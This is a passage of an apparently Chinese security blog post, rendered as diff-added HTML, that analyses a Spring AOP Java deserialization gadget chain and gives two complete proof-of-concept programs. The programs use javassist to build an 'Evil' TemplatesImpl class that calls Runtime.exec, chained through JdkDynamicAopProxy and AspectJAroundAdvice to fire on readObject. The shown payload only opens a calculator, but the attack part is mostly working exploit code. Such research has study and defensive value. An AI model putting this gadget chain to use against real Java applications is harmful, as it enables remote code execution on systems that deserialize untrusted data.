+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//代理设置</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">invocatinoHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AopProxy</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">AopProxy</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">AopProxy</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="n">invocatinoHandler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">bad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">bad</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">proxy</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">bad</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行后就直接在反序列化时弹出计算机了。</p>
+<p>再调试一下基本过程，有不同点：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503223101762.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503223101762"
+	
+	
+></p>
+<p>这里为什么会有呢，不应该是会进入if条件吗？缓存问题？没调出来，搞不懂？</p>
+<p>而对于为什么调用无参数构造方法，可以自己去跟一下这里的过程。</p>
+<p>所以Gatget如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">JdkDynamicAopProxy</span><span class="err">#</span><span class="n">invoke</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">ReflectiveMethodInvocation</span><span class="err">#</span><span class="n">proceed</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">AspectJAroundAdvice</span><span class="err">#</span><span class="n">invoke</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">AbstractAspectJAdvice</span><span class="err">#</span><span class="n">invokeAdviceMethod</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AbstractAspectJAdvice</span><span class="err">#</span><span class="n">invokeAdviceMethodWithGivenArgs</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>基本和预期相同。</p>
+<h4 id="链子二">链子二
+</h4><p>这一条链子也是非常有意思的点，值得学习，具体过程上面提出来的点也非常清晰了，简单想了一下流程，感觉应该是在如下地方触发第二次JdkDynamicAopProxy的invoke()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503232447306.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503232447306"
+	
+	
+></p>
+<p>而第二次触发invoke()方法的流程就和jackson不稳定性解决的链子流程是一样的了，这里不多说。</p>
+<p>简单构造如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.aop.Advice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.intercept.MethodInterceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJAroundAdvice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.SingletonAspectInstanceFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AopProxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJExpressionPointcut</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.support.DefaultIntroductionAdvisor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//使用javassist定义恶意代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Evil&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[][]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">classBytes</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">impl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="n">code</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">method1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">impl</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;newTransformer&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJExpressionPointcut</span><span class="w"> </span><span class="n">pointcut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJExpressionPointcut</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SingletonAspectInstanceFactory</span><span class="w"> </span><span class="n">x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SingletonAspectInstanceFactory</span><span class="p">(</span><span class="n">impl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJAroundAdvice</span><span class="w"> </span><span class="n">aspectJAroundAdvice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJAroundAdvice</span><span class="p">(</span><span class="n">method1</span><span class="p">,</span><span class="n">pointcut</span><span class="p">,</span><span class="n">x1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz0</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport0</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">aspectJAroundAdvice</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Advice</span><span class="w"> </span><span class="n">proxy0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Advice</span><span class="p">)</span><span class="w"> </span><span class="n">getProxy</span><span class="p">(</span><span class="n">constructor0</span><span class="p">,</span><span class="n">advisedSupport0</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">MethodInterceptor</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Advice</span><span class="p">.</span><span class="na">class</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DefaultIntroductionAdvisor</span><span class="w"> </span><span class="n">decorator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultIntroductionAdvisor</span><span class="p">(</span><span class="n">proxy0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport1</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">impl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport1</span><span class="p">.</span><span class="na">addAdvisor</span><span class="p">(</span><span class="n">decorator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//代理设置</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AopProxy</span><span class="w"> </span><span class="n">proxy2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">AopProxy</span><span class="p">)</span><span class="w"> </span><span class="n">getProxy</span><span class="p">(</span><span class="n">constructor0</span><span class="p">,</span><span class="n">advisedSupport1</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">AopProxy</span><span class="p">.</span><span class="na">class</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">bad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">bad</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">proxy2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">bad</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getProxy</span><span class="p">(</span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="p">,</span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advised</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">interface1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">invocatinoHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advised</span><span class="p">);</span><span class="w">
